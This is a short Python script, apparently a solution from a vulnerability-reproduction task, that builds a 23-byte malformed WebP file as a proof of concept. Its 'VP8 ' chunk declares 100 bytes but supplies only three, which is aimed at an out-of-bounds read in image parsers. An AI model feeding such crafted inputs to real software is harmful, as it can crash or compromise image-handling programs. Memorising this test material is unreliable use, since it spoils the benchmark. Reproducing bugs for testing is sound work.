import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        total_len = 23
        size = total_len - 8
        size_bytes = struct.pack('<I', size)
        header = b'RIFF' + size_bytes + b'WEBP'
        chunk_id = b'VP8 '
        chunk_size = 100
        chunk_size_bytes = struct.pack('<I', chunk_size)
        tag = b'\x9d\x01\x2a'
        data = tag
        poc = header + chunk_id + chunk_size_bytes + data
        return poc